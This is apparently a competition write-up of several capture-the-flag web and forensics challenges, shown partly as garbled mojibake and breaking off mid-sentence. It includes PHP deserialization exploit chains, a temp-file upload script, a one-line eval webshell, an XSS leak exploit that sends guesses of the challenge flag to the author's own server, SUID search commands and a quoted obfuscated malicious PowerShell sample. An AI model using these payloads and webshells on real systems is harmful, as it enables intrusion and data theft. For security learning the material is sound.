ppp[number1]=2333m&amp;ppp[number2]=1e10&amp;ppp[number3]=61823470&amp;ppp[number4]=-aabcdf&amp;ppp[number5]=null KEY1{e1e1d3d40573127e9ee0480caf1283d6} çº¿ç´¢2 æ–‡ä»¶ä¸‹è½½å‡ ç§’ä¼šè‡ªåŠ¨ææ–­ï¼Œè€ƒè™‘æ–­ç‚¹ç»­ä¼ ï¼Œç”¨ IDM ç›´æ¥å°±èƒ½å®ç°ã€‚ æ‰“å¼€ä¸€å †çš„ docxï¼Œé‡Œé¢ä¸€å †åƒåœ¾ ASCIIï¼Œå†™ä¸ªè„šæœ¬æŠŠæ‰€æœ‰ docx æ–‡ä»¶è¯»ä¸€ä¸‹ã€‚ import os import docx import glob files = glob.glob('.\\\\five_month\\\\*\\\\*\\\\*.docx') print(files) for file in files: doc = docx.Document(file) for i in doc.paragraphs: try: # print(i.text) if 'KEY2' in i.text: print(i.text) print('============================') except: pass å…¶ä¸­æœ‰ä¸ªå°±æ˜¯KEY2 KEY2{T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS} æäº¤æ‹¿åˆ° flag ï¼ˆè¿™æ ·å¥—å¨ƒå¤ªæ¶å¿ƒäº† [å¼ºç½‘å…ˆé”‹]èµŒå¾’æºç ï¼š &lt;meta charset=\"utf-8\"&gt; &lt;?php //hint is in hint.php error_reporting(1); class Start { public $name='guest'; public $flag='syst3m(\"cat 127.0.0.1/etc/hint\");'; public function __construct(){ echo \"I think you need /etc/hint . Before this you need to see the source code\"; } public function _sayhello(){ echo $this-&gt;name; return 'ok'; } public function __wakeup(){ echo \"hi\"; $this-&gt;_sayhello(); } public function __get($cc){ echo \"give you flag : \".$this-&gt;flag; return ; } } class Info { private $phonenumber=123123; public $promise='I do'; public function __construct(){ $this-&gt;promise='I will not !!!!'; return $this-&gt;promise; } public function __toString(){ return $this-&gt;file['filename']-&gt;ffiillee['ffiilleennaammee']; } } class Room { public $filename='/flag'; public $sth_to_set; public $a=''; public function __get($name){ $function = $this-&gt;a; return $function(); } public function Get_hint($file){ $hint=base64_encode(file_get_contents($file)); echo $hint; return ; } public function __invoke(){ $content = $this-&gt;Get_hint($this-&gt;filename); echo $content; } } if(isset($_GET['hello'])){ unserialize($_GET['hello']); }else{ $hi = new Start(); } ?&gt; Room é‡Œå¯ä»¥è¯»å–æ–‡ä»¶å¹¶è¾“å‡ºï¼Œä½†æ˜¯éœ€è¦ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨è¿™ä¸ªå¯¹è±¡ã€‚æ­£å¥½é‡Œé¢çš„ __get() æ–¹æ³•å½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„å±æ€§æˆ–è€…ç§æœ‰çš„å±æ€§çš„æ—¶å€™å°±èƒ½è§¦å‘è°ƒç”¨ä»–è‡ªå·±ã€‚ å†çœ‹ Info å¯¹è±¡é‡Œçš„ __toString å°±å¯ä»¥è°ƒç”¨ä¸€ä¸ª Room é‡Œä¸å­˜åœ¨çš„å¯¹è±¡ ffiillee['ffiilleennaammee']ã€‚ ä¸ºäº†å®ç°è¾“å‡º Infoï¼Œçœ‹åˆ° Start é‡Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨ _sayhello() æ–¹æ³•ã€‚ äºæ˜¯è®© Start-&gt;name æŒ‡å‘ Infoï¼ŒInfo-&gt;file['filename'] æŒ‡å‘ Roomï¼Œç„¶åä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ Roomï¼ŒRoom-&gt;filename = '/flag' å°±èƒ½è¾“å‡º flag äº†ã€‚ ï¼ˆè¿™é‡Œè¯´çš„å¯¹è±¡è¿˜è¦å®ä¾‹åŒ–ä¸€ä¸‹ Expï¼š &lt;?php error_reporting(1); class Start { public $name; } class Info { private $phonenumber = 123123; public $promise = 'I do'; } class Room { public $filename = '/flag'; public $sth_to_set; public $a = ''; } $c = new Room(); $d = new Room(); $d-&gt;filename = '/flag'; $a = new Start(); $b = new Info(); $b-&gt;file['filename'] = $c; $a-&gt;name = $b; $c-&gt;a = $d; echo urlencode(serialize($a)); ?&gt; WhereIsUWebShellæºç  &lt;!-- You may need to know what is in e2a7106f1cc8bb1e1318df70aa0a3540.php--&gt; &lt;?php // index.php ini_set('display_errors', 'on'); if(!isset($_COOKIE['ctfer'])){ setcookie(\"ctfer\",serialize(\"ctfer\"),time()+3600); }else{ include \"function.php\"; echo \"I see your Cookie&lt;br&gt;\"; $res = unserialize($_COOKIE['ctfer']); if(preg_match('/myclass/i',serialize($res))){ throw new Exception(\"Error: Class 'myclass' not found \"); } } highlight_file(__FILE__); echo \"&lt;br&gt;\"; highlight_file(\"myclass.php\"); echo \"&lt;br&gt;\"; highlight_file(\"function.php\"); &lt;?php // myclass.php class Hello{ public function __destruct() { if($this-&gt;qwb) echo file_get_contents($this-&gt;qwb); } } ?&gt; &lt;?php // function.php function __autoload($classname){ require_once \"/var/www/html/$classname.php\"; } ?&gt; å…¥å£çš„ COOKIE å­˜åœ¨ååºåˆ—åŒ– å»æ‰æœ€åçš„å¤§æ‹¬å·ï¼Œåˆ©ç”¨ååºåˆ—åŒ–æŠ¥é”™æ¥é˜²æ­¢è¿›å…¥ Exception O:7:\"myclass\":1:{s:1:\"h\";O:5:\"Hello\":1:{s:3:\"qwb\";s:36:\"e2a7106f1cc8bb1e1318df70aa0a3540.php\";} O%3A7%3A%22myclass%22%3A1%3A%7Bs%3A1%3A%22h%22%3BO%3A5%3A%22Hello%22%3A1%3A%7Bs%3A3%3A%22qwb%22%3Bs%3A36%3A%22e2a7106f1cc8bb1e1318df70aa0a3540%2Ephp%22%3B%7D e2a7106f1cc8bb1e1318df70aa0a3540.php &lt;?php include \"bff139fa05ac583f685a523ab3d110a0.php\"; include \"45b963397aa40d4a0063e0d85e4fe7a1.php\"; $file = isset($_GET['72aa377b-3fc0-4599-8194-3afe2fc9054b'])?$_GET['72aa377b-3fc0-4599-8194-3afe2fc9054b']:\"404.html\"; $flag = preg_match(\"/tmp/i\",$file); if($flag){ PNG($file); } include($file); $res = @scandir($_GET['dd9bd165-7cb2-446b-bece-4d54087185e1']); if(isset($_GET['dd9bd165-7cb2-446b-bece-4d54087185e1'])&amp;&amp;$_GET['dd9bd165-7cb2-446b-bece-4d54087185e1']==='/tmp'){ $somthing = GenFiles(); $res = array_merge($res,$somthing); } shuffle($res); @print_r($res); ?&gt; bff139fa05ac583f685a523ab3d110a0.php &lt;?php function PNG($file) { if(!is_file($file)){die(\"æˆ‘ä»æ¥æ²¡æœ‰è§è¿‡ä¾¬\");} $first = imagecreatefrompng($file); if(!$first){ die(\"å‘ç°äº†å¥‡æ€ªçš„ä¸œè¥¿2333\"); } $size = min(imagesx($first), imagesy($first)); unlink($file); $second = imagecrop($first, ['x' =&gt; 0, 'y' =&gt; 0, 'width' =&gt; $size, 'height' =&gt; $size]); if ($second !== FALSE) { imagepng($second, $file); imagedestroy($second);//é”€æ¯ï¼Œæ¸…å†…å­˜ } imagedestroy($first); } ?&gt; 45b963397aa40d4a0063e0d85e4fe7a1.php &lt;?php function GenFiles(){ $files = array(); $str = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $len=strlen($str)-1; for($i=0;$i&lt;10;$i++){ $filename=\"php\"; for($j=0;$j&lt;6;$j++){ $filename .= $str[rand(0,$len)]; } // file_put_contents('/tmp/'.$filename,'flag{fake_flag}'); $files[] = $filename; } return $files; } ?&gt; /e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=passwd&amp;dd9bd165-7cb2-446b-bece-4d54087185e1=/tmp å½“å‰åº”è¯¥æ˜¯åœ¨ /etc ç›®å½•ä¸‹ï¼ˆï¼Ÿ ä¸è¿‡æ²¡å•¥ç”¨ï¼Œä¸èƒ½ç›´æ¥è¯» /flagï¼Œæˆ–è€…è¯´ flag ä¸åœ¨æ ¹ç›®å½• å‚è€ƒ LFI via SegmentFault include.php?file=php://filter/string.strip_tags/resource=/etc/passwd å¯ä»¥å¯¼è‡´ php åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ Segment Fault æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥è®© php åŒ…å«è‡ªèº«ä»è€Œå¯¼è‡´æ­»å¾ªç¯ç„¶å php å°±ä¼šå´©æºƒ , å¦‚æœè¯·æ±‚ä¸­åŒæ—¶å­˜åœ¨ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚çš„è¯ , è¿™ä¸ªæ–‡ä»¶å°±ä¼šè¢«ä¿ç•™ é­”æ”¹ä»–çš„è„šæœ¬ # -*- coding: utf-8 -*- import requests import string import itertools charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' base_url = \"http://eci-2ze9gh3z7jcw29alwhuz.cloudeci1.ichunqiu.com\" def upload_file_to_include(url, file_content): files = {'file': ('evil.jpg', file_content, 'image/jpeg')} try: response = requests.post(url, files=files) print(response) except Exception as e: print(e) def generate_tmp_files(): with open('miao.png', 'rb') as fin: file_content = fin.read() phpinfo_url = \"%s/e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=php://filter/string.strip_tags/resource=passwd\" % ( base_url) length = 6 times = int(len(charset) ** (length / 2)) for i in range(times): print(\"[+] %d / %d\" % (i, times)) upload_file_to_include(phpinfo_url, file_content) def main(): generate_tmp_files() if __name__ == \"__main__\": main() å›¾ç‰‡æ˜¯ä¸ªé•¿å®½ç›¸ç­‰çš„ pngï¼Œé‡Œé¢æ”¾æœ¨é©¬ã€‚ ä¸Šä¼ è¿‡ç¨‹ä¸­å°±ä¼šç•™ä¸‹ä¸€äº›æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤ã€‚ ä¸€è¾¹è·‘è¿™ä¸ªè„šæœ¬ï¼Œå¦ä¸€è¾¹çš„ä¸€å † /tmp/phpxxxxxx é‡Œå°±å­˜åœ¨æˆ‘ä»¬çš„ webshell ç”±äºä¼šè‡ªåŠ¨åˆ é™¤ï¼Œæ²¡äº†å°±æ¢æ–°çš„ æ ¹ç›®å½•æœç„¶æ²¡ flag ç„¶ååˆ©ç”¨ shell å‘ç° /usr/bin ä¸‹é¢æœ‰ä¸ªæ–‡ä»¶å¯ä»¥ä»¥ root æƒé™æ‰§è¡Œå‘½ä»¤ find / -user root -perm -4000 -print 2&gt;/dev/null # æˆ–è€… # find / -perm -u=s -type f 2&gt;/dev/null flag åœ¨ /l1b ä¸‹ä¸€ä¸ªç»•æ¥ç»•å»çš„ç›®å½•é‡Œé¢ï¼ˆæ¶å¿ƒå¿ƒ æˆ–è€… find / -perm 600 -user root æœ€åæ‰§è¡Œ /usr/bin/ed471efd0577be6357bb94d6R3@dF1aG /l1b/82a71a2d/e17e0f28/74cb5ced/8f93ff64/3396136a/Fl444ggg160b5c41 POST /e2a7106f1cc8bb1e1318df70aa0a3540.php?b822f88a-de15-4dc8-923b-1cbeec54bcfc=/tmp/phpi8bEt1&amp;0=system HTTP/1.1 Host: eci-2zehg7ugvk0ahcsnkehl.cloudeci1.ichunqiu.com Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: UM_distinctid=1769d95cb5b54d-04781d3935eefa-c791039-1fa400-1769d95cb5c669; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1611909425; ctfer=s%3A5%3A%22ctfer%22%3B; __jsluid_h=847d751b863f86e3ed743f9efb5d5c4f Connection: close Content-Length: 110 Content-Type: application/x-www-form-urlencoded 1=/usr/bin/ed471efd0577be6357bb94d6R3@dF1aG /l1b/82a71a2d/e17e0f28/74cb5ced/8f93ff64/3396136a/Fl444ggg160b5c41 flag{b101e657-a46a-4791-abcb-5be544fc12bd} EasyWeb é¢˜ç›®æ¥æºäºæŸæ¬¡å¸®æœ‹å‹æµ‹è¯•é¡¹ç›®çš„æ¸—é€è¿‡ç¨‹ï¼Œéå¸¸éå¸¸ç®€å•ï¼Œæ²¡æœ‰æ–°çš„çŸ¥è¯†ç‚¹ï¼Œå·²ç»å»æ‰äº†å¾ˆå¤šéœ€è¦è„‘æ´çŒœæµ‹çš„éƒ¨åˆ†ï¼Œä¸è¿‡ä¾ç„¶éœ€è¦è¿›è¡Œä¸€äº›ä¿¡æ¯æ”¶é›†å·¥ä½œã€‚So~ Be Patient~And have funny! â€‹ 47.104.136.46â€‹ 47.104.137.239â€‹ 121.42.242.238 ï¼ˆæ¯ 20 åˆ†é’Ÿé‡å¯ä¸€æ¬¡ç¯å¢ƒï¼‰ flagä¸åœ¨æ•°æ®åº“ï¼›1. èƒ½çœ‹åˆ°æŠ¥é”™ä¿¡æ¯æ˜¯é¢„æœŸç°è±¡ ç›´æ¥è®¿é—®ï¼Œæ ¹æ® html é‡Œçš„æç¤ºè®¿é—® /hintï¼Œå¾—çŸ¥æ–‡ä»¶åœ¨ /files/???????????????????????????????? è®¿é—® /file ä¸‹è½½å¾—åˆ°ç›¸åº”çš„æ–‡ä»¶ æ ¹æ®é‡Œé¢çš„ hint.txtï¼Œæ‰«æç«¯å£å¾—åˆ° http://121.42.242.238:36842 Try to scan 35000-40000 ^_^. All tables are empty except for the table where the username and password are located Table: employee sql æ³¨å…¥å¾—åˆ°ç™»å½•ä¿¡æ¯ä¸º adminã€99f609527226e076d668668582ac4420 æ‰«ç›®å½•å¾—åˆ° /file æœ‰æ–‡ä»¶ä¸Šä¼  ç›´æ¥ä¸Šä¼ ä¼šè¢«å¡ æ”¹æ–‡ä»¶åä¸º php.php å¯ä»¥ç»•è¿‡ ç„¶åæ–‡ä»¶å†…å®¹ç»•è¿‡ï¼Œå…ˆç”¨æ®µæ ‡ç­¾å’Œ $_GET[1] ç»•è¿‡å†™å°é©¬ï¼Œå†é€šè¿‡ ?1=echo '&lt;?php @eval($_POST[m]);?&gt;' &gt; x.php å†™é©¬ã€‚ èšå‰‘è¿ä¸Šä¹‹åå‘ç°æƒé™ä¸å¤Ÿï¼Œè¯»ä¸äº† flagã€‚ æŸ¥çœ‹ç«¯å£å‘ç°æœ‰ä¸ªç«¯å£è¿˜è·‘ç€ jbossã€‚ ä»£ç†æ•´å‡ºæ¥ï¼Œç„¶åå‚è€ƒ jbossæ¼æ´getshell å†™ webshellï¼Œæœ€åè¯»åˆ° flagã€‚ ï¼ˆæ¯”èµ›ç»“æŸä¹‹åç¯å¢ƒå…³äº†ä¹Ÿå°±ä¹ˆå¾—å›¾äº† flag{V3ry_v3rY_E3si_a_w3B_Ch@1l3ng3} EasyXSS The BOT starts every five seconds and handles only one reported URL at a time. The BOT is Google-Chrome 91.0.4472.77 (Official Build) (64-bit) Notice: the address requested by the BOT is http://localhost:8888. Each time the BOT processes a request, it clears subsequent report URLs from the database æ¯ 15 åˆ†é’Ÿé‡å¯ç¯å¢ƒ 47.104.192.54:888847.104.210.56:888847.104.155.242:8888 Hint: flagæ ¼å¼æ˜¯flag{uuid} ç®—æ˜¯ä¸ª XS-Leaks çš„é¢˜ç›®ï¼Œç®—æ˜¯ä¾§ä¿¡é“çš„ä¸€ç§å§ã€‚ é€šè¿‡ /hint è·¯ç”±å¯ä»¥çŸ¥é“ flag åˆ¤æ–­é€»è¾‘ã€‚ app.all(\"/flag\", auth, async (req, res, next) =&gt; { if (req.session.isadmin &amp;&amp; typeof req.query.var === \"string\") { fs.readFile(\"/flag\", \"utf8\", (err, flag) =&gt; { let flagArray = flag.split(\"\"); let dataArray = req.query.var.split(\"\"); let check = true; for (let i = 0; i &lt; dataArray.length &amp;&amp; i &lt; flagArray.length; i++) { if (dataArray[i] !== flagArray[i]) { check = false; break; } } if (check) { res.status(200).send(req.query.var); } else { res.status(500).send(\"Keyword Error!\"); } }); } else { res.status(500).send(\"Sorry, you are not admin!\"); } }); /flag è·¯ç”±å¯¹è¾“å…¥çš„é€ä¸ªå­—ç¬¦ä¸ flag çš„è¿™ä¹ˆå¤šä¸ªï¼ˆè¾“å…¥çš„ï¼‰é•¿åº¦çš„å­—ç¬¦è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæ¯ä¸€ä½éƒ½ç›¸åŒåˆ™è¿”å› 200ï¼Œå¦åˆ™è¿”å› 500. äºæ˜¯å¯ä»¥åˆ©ç”¨ XSS å»è®© bot è®¿é—®è¿™ä¸ªæ¥å£ä»¥ admin æ¥éªŒè¯ã€‚ è®¿é—® /about?theme=xxxxx å‘ç°å­˜åœ¨ XSSã€‚ä¸è¿‡è¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œæ¯”å¦‚ ç©ºæ ¼å¯ä»¥ç”¨ %09 ç»•è¿‡ä¹‹ç±»ã€‚ æ ¹æ®æç¤º flag æ˜¯ä¸ª UUIDï¼Œäºæ˜¯å¯ä»¥æŒ‰ç…§è¿™ä¸ªæ ¼å¼é€ä½çˆ†ç ´ï¼Œé€šè¿‡è¿”å›çš„çŠ¶æ€æ¥åˆ¤æ–­å½“å‰å­—ç¬¦æ˜¯å¦æ­£ç¡®ã€‚ äºæ˜¯å°±åœ¨ VPS ä¸Šè·‘ä¸ªè„šæœ¬ï¼Œåˆ†æˆåŠŸå’Œå¤±è´¥ä¸¤ä¸ªè·¯ç”±ï¼Œè®© bot è®¿é—®è‡ªå·±çš„ /flag è·¯ç”±ã€‚ å¦‚æœæˆåŠŸè¿”å›åˆ™è°ƒç”¨ Ajax å»è¯·æ±‚ VPS ä¸Šçš„ success è·¯ç”±ï¼Œå¦åˆ™è¯·æ±‚ error è·¯ç”±ï¼Œå¹¶é€šè¿‡å‚æ•°è¿”å›å½“å‰çˆ†ç ´çš„ flagã€‚ expï¼š from flask import Flask from flask import request import requests import urllib.parse app = Flask(__name__) @app.route(\"/success\") def index(): global cookies global url data = request.args.get('a') if len(data) == 13 or len(data) == 18 or len(data) == 23 or len(data) == 28: data += \"-0\" else: data += \"0\" p = '''\";t=\"''' + data +'''\",$.ajax({url:\"/flag?var=\"+t}).done(function(o){window.location=\"http://è‡ªå·±çš„VPS/success?a=\"+t}).fail(function(){window.location=\"http://è‡ªå·±çš„VPS/error?a=\"+t});//''' p = \"http://localhost:8888/about?theme=\" + urllib.parse.quote(p) d = { \"url\": p } requests.post(url, data=d, cookies=cookies) return \"Hello World!\" @app.route(\"/error\") def index2(): global cookies global url data = request.args.get('a') tmp = data[:-1] if data[-1] == \"9\": tmp += \"a\" else: tmp += chr(ord(data[-1]) + 1) data = tmp p = '''\";t=\"''' + data +'''\",$.ajax({url:\"/flag?var=\"+t}).done(function(o){window.location=\"http://è‡ªå·±çš„VPS/success?a=\"+t}).fail(function(){window.location=\"http://è‡ªå·±çš„VPS/error?a=\"+t});//''' p = \"http://localhost:8888/about?theme=\" + urllib.parse.quote(p) d = { \"url\": p } requests.post(url, data=d, cookies=cookies) return \"Hello World!\" cookies = {\"session\":\"s%3ASuDwPHFP03I6VDRGiad8Zzst0owLeQY_.MjxB%2BTBwTgesKkEE9dIR95EoJPMuNNh%2BOZFw6ajDMm0\"} # url = \"http://47.104.210.56:8888/report\" url = \"http://47.104.192.54:8888/report\" app.run(host='0.0.0.0', port=80) è®© bot ä» 0 å¼€å§‹è®¿é—®ï¼Œè™½ç„¶å®¹å™¨å›ºå®šæ—¶é—´é‡å¯ï¼Œä½†æ˜¯ flag æ˜¯é™æ€çš„ uuidï¼Œæ‰€ä»¥å°±æ˜¯æ—¶é—´é—®é¢˜äº†ã€‚ æœ€åæ ¹æ® VPS ä¸Šçš„è®¿é—®è®°å½•å°±èƒ½å¾—åˆ° flag äº†ã€‚ MiscBlueTeaming Powershell scripts were executed by malicious programs. What is the registry key that contained the power shellscript content?ï¼ˆæœ¬é¢˜flagä¸ºéæ­£å¼å½¢å¼ï¼‰ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ å‹ç¼©åŒ…è§£å‹å¯†ç ï¼šfantasicqwb2021 é¦–å…ˆä½¿ç”¨ volatility å°†å†…å­˜ä¸­çš„ register hive å¯¼å‡ºæ¥. volatility -f memory.dmp --profile Win7SP1x64 hivelist volatility -f memory.dmp --profile Win7SP1x64 dumpregistry -D . é¢˜ç›®ä¸­è¯´åˆ°å¯èƒ½å’Œ powershell æ¶æ„ç¨‹åºæœ‰å…³ç³»ï¼Œé‚£ä¹ˆä¼˜å…ˆè€ƒè™‘ SOFTWARE ä¸“ç”¨çš„å­—ç¬¦ä¸²ï¼Œä½¿ç”¨ WRR.exe å·¥å…·æ£€æŸ¥æ³¨å†Œè¡¨ï¼Œç„¶åå…¨å±€æœç´¢ä¸€äº›å¸¸è§çš„æ¶æ„è½¯ä»¶å­—æ®µï¼Œæ¯”å¦‚ -IEX, encode decompress new-object ç­‰ç­‰ï¼Œæœ€ç»ˆèƒ½å¤Ÿæ‰¾åˆ°æ¶æ„è½¯ä»¶å­˜æ”¾çš„æ³¨å†Œè¡¨ä½ç½® æœåˆ°ä¸€ä¸ªè·¯å¾„æ˜¯CMI-CreateHive{199DAFC2-6F16-4946-BF90-5A3FC3A60902}\\Microsoft\\Windows\\Communication æ¶æ„è„šæœ¬æ˜¯ &amp; ( $veRBOsepReFErEncE.tOstrINg()[1,3]+'x'-JOin'')( nEW-ObjEcT sySTEm.iO.sTreaMReAdER( ( nEW-ObjEcT SystEm.iO.CompreSsiOn.DEfLATEstREam([IO.meMoryStream] [CoNVeRT]::fROMbASe64StRinG('NVJdb5tAEHyv1P9wQpYAuZDaTpvEVqRi+5Sgmo/Axa0VRdoLXBMUmyMGu7Es//fuQvoAN7e7Nzua3RqUcJbgQVLIJ1hzNi/eGLMYe2gOFX+0zHpl9s0Uv4YHbnu8CzwI8nIW5UX4bNqM2RPGUtU4sPQSH+mmsFbIY87kFit3A6ohVnGIFbLOdLlXCdFhAlOT3rGAEJYQvfIsgmAjw/mJXTPLssxsg3U59VTvyrT7JjvDS8bwN8NvbPYt81amMeItpi1TI3omaErK0fO5bNr7LQVkWjYkqlZtkVtRUK8xxAQxxqylGVwM3dFX6jtw6TgbnrPRCMFlm75i3xAPhq2aqUnNKFyWqhNiu0bC4wV6kXHDsh6yF5k8Xgz7Hbi6+ACXI/vLQyoSv7x5/EgNbXvy+VPvOAtyvWuggvuGvOhZaNFS/wTlqN9xwqGuwQddst7Rh3AfvQKHLAoCsq4jmMJBgKrpMbm/By8pcDQLzlju3zFn6S12zB6PjXsIfcj0XBmu8Qyqma4ETw2rd8w2MI92IGKU0HGqEGYacp7/Z2U+CB7gqJdy67c2dHYsOA0H598N33b3cr3j2EzoKXgpiv1+XjfbIryhRk+wakhq16TSqYhpKcHbpNTox9GYgyekcY0KcFGyKFf56YTF7drg1ji/+BMk/G7H04Y599sCFW3+NG71l0aXZRntjFu94FGhHidQzYvOsSiOaLsFxaY6P6CbFWioRSUTGdSnyT8=' ) , [IO.coMPressION.cOMPresSiOnmOde]::dEcOMPresS)), [TexT.ENcODInG]::AsCIi)).ReaDToeNd() flagæ˜¯ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Communication CipherMan The attacker maliciously accessed the userâ€™s PC and encrypted specific volumes. How to decrypt the volume?ï¼ˆæœ¬é¢˜flagä¸ºéæ­£å¼å½¢å¼ï¼‰ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ å‹ç¼©åŒ…è§£å‹å¯†ç ï¼šfantasicqwb2021 BitLocker ë“œë¼ì´ë¸Œ ì•”í˜¸í™” ë³µêµ¬ í‚¤ ë³µêµ¬ í‚¤ëŠ” BitLockerë¡œ ë³´í˜¸ë˜ëŠ” ë“œë¼ì´ë¸Œì—ì„œ ë°ì´í„°ë¥¼ ê²€ìƒ‰í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ í‚¤ê°€ ì˜¬ë°”ë¥¸ ë³µêµ¬ í‚¤ì¸ì§€ í™•ì¸í•˜ë ¤ë©´ ë³µêµ¬ í™”ë©´ì— í‘œì‹œëœ ê²ƒê³¼ IDë¥¼ ë¹„êµí•˜ì‹­ì‹œì˜¤. ë³µêµ¬ í‚¤ ID: 168F1291-82C1-4B ì „ì²´ ë³µêµ¬ í‚¤ ID: 168F1291-82C1-4BF2-B634-9CCCEC63E9ED BitLocker ë³µêµ¬ í‚¤: 221628-533357-667392-449185-516428-718443-190674-375100 BitLockeré©±åŠ¨å™¨åŠ å¯†æ¢å¤é”® æ¢å¤å¯†é’¥ç”¨äºåœ¨è¢«ä¿æŠ¤ä¸ºBitLockerçš„é©±åŠ¨å™¨ä¸­æœç´¢æ•°æ®ã€‚ å¦‚æœæ‚¨æƒ³ç¡®è®¤æ­¤å¯†é’¥æ˜¯å¦æ­£ç¡®ï¼Œè¯·æ¯”è¾ƒæ¢å¤å±å¹•ä¸Šæ˜¾ç¤ºçš„å’ŒIDã€‚ æ¢å¤å¯†é’¥ID:168F1291-82C1-4B æ•´ä½“æ¢å¤å¯†é’¥ID:168F1291-82C1-4BF2-B634-9CCCEC63E9ED BitLockeræ¢å¤é”®ï¼š 221628-533357-667392-449185-516428-718443-190674-375100 DiskGenius è§£å¯† Wowï¼Œyou have a great ability. How did you solve this? Are you a hacker? Please give me a lesson later. æ‰¾äº†åŠå¤©æœ€åå‘ç°è¿™ä¸ªå†…å®¹å°±æ˜¯ flagã€‚ã€‚ èµ›åå‘ç°å±…ç„¶æ˜¯åŸé¢˜ Digital Forensic Challenge 2018 VOI200 ë¬¸ì œ í’€ì´ ExtremelySlow é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ å‹ç¼©åŒ…è§£å‹å¯†ç ï¼šfantasicqwb2021 é¦–å…ˆæ˜¯ä¸€ä¸ªæµé‡åŒ…ï¼Œé‡Œé¢å…¨æ˜¯ TCP å’Œ HTTP æµé‡ã€‚è€Œä¸”æ˜¯ 206 åˆ†æ®µä¼ è¾“ï¼Œæ¯ä¸ªåŒ…ä¼  1byteã€‚ äºæ˜¯å…ˆå¯¼å‡ºä¸º JSONï¼Œç„¶åå†™ä¸ªè„šæœ¬æå–å…¶ä¸­çš„æ¯ä¸ª byteï¼Œæœ€ååˆå¹¶å¾—åˆ°ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚ wireshark ç›´æ¥å¯¼å‡ºçš„ JSON é‡Œ http.response.line åŒ…å«å¤šä¸ªï¼Œå¦‚æœç›´æ¥ç”¨ json.loads åªä¿ç•™æœ€åä¸€ä¸ªäº†ï¼Œæ‰€ä»¥å…ˆè¦å»æ‰æ— å…³çš„å†…å®¹ã€‚ import json import re with open('http.json', 'r', encoding='utf-8') as fin: s = fin.read() re_num = re.compile( r'\\\"http\\.response\\.line\\\": \\\"content-range: bytes (\\d+)-\\d+/1987\\\\r\\\\n\\\"') re_nonnum = re.compile( r'(\\\"http\\.response\\.line\\\": (?!\\\"content-range: bytes (\\d+)-\\d+/1987\\\\r\\\\n\\\",).*)') s1 = re.sub(re_nonnum, '', s) with open('http_sub.json', 'w', encoding='utf-8') as fout: fout.write(s1) http = json.loads(s1) total = [b''] * 1987 # total = [''] * 1987 idx_list = [] for x in http: source = x['_source'] layers = source['layers'] # get data data = layers['data']['data.data'] data = bytes([int(data, 16)]) # find index n = layers['http']['http.response.line'] idx = int(re.search(r'(\\d+)-\\d+/1987', n)[1]) idx_list.append(idx) total[idx] = data print(total) t = b''.join(total) # t = ''.join(total) # print(len(t)/2) with open('decode.pyc', 'wb') as f: f.write(t) # with open('decode1.pyc', 'w') as f: # f.write(t) æˆ–è€…ç›´æ¥å‘½ä»¤è¡Œç”¨ tshark æ›´å¿«ï¼Œä¸è¿‡å½“æ—¶å°±æ²¡æƒ³åˆ°è¿™ä¹ˆå†™å–µå‘œå‘œå‘œã€‚ æŒ‰ index æŠŠè¿™ä¸ªåˆå¹¶å°±è¡Œï¼Œbash è„šæœ¬ç±»ä¼¼è¿™æ · tshark -r ExtremelySlow.pcapng -T fields -e data -Y \"http.response.line == \\\"content-range: bytes $idx-$idx/1987\\x0d\\x0a\\\"\" 2&gt;/dev/null æ ¹æ®æ–‡ä»¶å†…å®¹å¾—çŸ¥æ˜¯ä¸ª pyc æ–‡ä»¶ã€‚ ä½†æ˜¯ç›´æ¥æ‹¿åœ¨çº¿å·¥å…·æˆ–è€… uncompyle6 åç¼–è¯‘éƒ½ä¸æˆï¼Œå‘ç° magic number æœ‰è¯¯ã€‚ å‚è€ƒ Pythonâ€™s magic numbers Python Uncompyle6 åç¼–è¯‘å·¥å…·ä½¿ç”¨ ä¸ Magic Number è¯¦è§£ https://github.com/google/pytype/blob/master/pytype/pyc/magic.py Understanding Python Bytecode å¯ä»¥å‘ç°æ–‡ä»¶å¤´çš„è¿™ä¸ª magic number æ˜¯éšç‰ˆæœ¬å·é€’å¢çš„ï¼Œè€Œä¸”æ¯”æœ€æ–°çš„ 3.9.5 è·¨äº†ä¸€å¤§æˆªã€‚ äºæ˜¯è€ƒè™‘æ‹‰ä¸ª py3.10 çš„é•œåƒä¸‹æ¥ã€‚ docker run --rm -it python:3.10.0b2 æ ¹æ® magic number 